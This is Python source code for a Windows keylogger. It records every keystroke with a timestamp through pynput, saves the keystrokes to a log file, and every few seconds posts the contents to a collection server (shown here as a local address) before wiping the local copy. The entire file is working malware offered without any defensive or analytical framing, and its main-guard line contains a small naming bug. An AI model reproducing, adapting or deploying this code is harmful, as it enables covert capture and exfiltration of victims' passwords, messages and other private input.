#!/usr/bin/python3

import sys
import os
import platform
import threading
import requests
import logging
from datetime import datetime
from pynput import keyboard

logging.basicConfig(filename="error.log", level=logging.ERROR)

SERVER_URL = "http://127.0.0.1:6700/set-log/"

class Keylogger:
    def __init__(self, server_url, interval=60):
        self.server_url = server_url
        self.interval = interval
        self.log = ""
        self.log_file = "keystrokes.log"
        self.log_dir = "logs"
        os.makedirs(self.log_dir, exist_ok=True)

    def log_key(self, key):
        try:
            key_data = key.char
        except AttributeError:
            key_data = f"[{key}]"
        timestamp = datetime.now()
        log_entry = f"{timestamp} - {key_data}\n"
        self.log += log_entry

    def save_log_to_file(self):
        try:
            save_path = os.path.join(self.log_dir, self.log_file)
            with open(save_path, "a") as file:
                file.write(self.log)
            self.log = ""
        except Exception as e:
            logging.error(f"Error saving log to file: {e}")

    def send_log_to_server(self):
        save_path = os.path.join(self.log_dir, self.log_file)
        if not os.path.exists(save_path):
            return

        try:
            with open(save_path, "r") as file:
                content = file.read()

            if not content.strip():
                return

            data = {
                "filename": self.log_file,
                "content": content
            }

            response = requests.post(self.server_url, json=data)

            if response.status_code == 200:
                logging.info("Log content sent successfully.")
                open(save_path, "w").close() 
            else:
                logging.error(f"Failed to send log content: {response.status_code} - {response.text}")
        except Exception as e:
            logging.error(f"Error sending log content to server: {e}")

    def report(self):
        self.save_log_to_file()
        self.send_log_to_server()
        threading.Timer(self.interval, self.report).start()

    def start(self):
        self.report()
        with keyboard.Listener(on_press=self.log_key) as listener:
            listener.join()

if name == "__main__":
    if platform.system() != "Windows":
        sys.exit()

    keylogger = Keylogger(server_url=SERVER_URL, interval=10)
    keylogger.start()
